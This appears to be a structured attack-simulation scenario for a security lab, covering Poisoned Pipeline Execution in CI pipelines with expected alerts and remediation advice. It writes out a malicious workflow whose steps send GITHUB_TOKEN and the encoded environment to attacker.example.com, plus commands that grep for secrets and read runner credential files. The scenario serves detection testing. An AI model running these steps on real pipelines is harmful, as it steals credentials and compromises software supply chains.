name: Poisoned Pipeline Execution (PPE)
description: Attacker modifies CI configuration in a pull request to execute malicious code within the pipeline, leveraging elevated pipeline permissions to access secrets and deploy backdoors
real_world_relevance: Codecov supply chain attack (2021), SolarWinds Orion build compromise, CircleCI breach (2023), numerous GitHub Actions PPE vulnerabilities disclosed by Legit Security and Cycode

techniques.name: Supply Chain Compromise: Compromise Software Supply Chain

attack_flow.description: Attacker submits a PR with modified CI configuration that injects malicious commands into the pipeline execution context
diagram: 3. PR triggers CI pipeline with injected commands
4. Pipeline runs with elevated secrets access (GITHUB_TOKEN, deploy keys)
5. Malicious commands exfiltrate secrets or inject backdoors into build artifacts

actions.command: find /runner/_work -name '*.yml' -path '*workflows*' 2>/dev/null || find /runner -name '.gitlab-ci.yml' 2>/dev/null || echo 'No pipeline configs found'

phases.name: Pipeline Configuration Injection
phases.description: Inject malicious commands into pipeline config via simulated PR

actions.command:
mkdir -p /tmp/evil-pr/.github/workflows && cat > /tmp/evil-pr/.github/workflows/ci.yml << 'EVIL'
name: CI
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -s http://attacker.example.com/exfil?token=$GITHUB_TOKEN
      - run: env | base64 | curl -d @- http://attacker.example.com/env
EVIL
echo 'Poisoned pipeline config created'

curl -s -X POST http://mock-cicd:8080/api/v1/pipeline/trigger -H 'Content-Type: application/json' -d '{"ref": "evil-pr-branch", "config_override": true}' 2>/dev/null || echo 'Pipeline trigger simulated'

phases.name: Secret Exfiltration via Pipeline
phases.description: Extract secrets that the pipeline has access to

actions.command: env | grep -iE 'TOKEN|SECRET|KEY|PASSWORD|GITHUB|DEPLOY' 2>/dev/null || echo 'No secrets in env'
cat /runner/.credentials 2>/dev/null; cat /runner/_work/_temp/.runner_token 2>/dev/null || echo 'No runner credentials found'

indicators_of_compromise.description: Pipeline configuration modified in pull request context
Pipeline executing commands from untrusted source

expected_wazuh_alerts.description: NHI: Pipeline configuration modified in pull request
NHI: Pipeline executing commands from untrusted source

immediate: Revoke all secrets exposed during the pipeline run
Audit pipeline execution logs for data exfiltration
Block the malicious PR and ban the contributing account
long_term: Require approval for CI runs on external PRs (GitHub: 'Require approval for all outside collaborators')
Pin actions to specific commit SHAs instead of tags
Use CODEOWNERS to protect workflow files from unauthorized changes
Use OpenSSF Scorecard to audit repository security
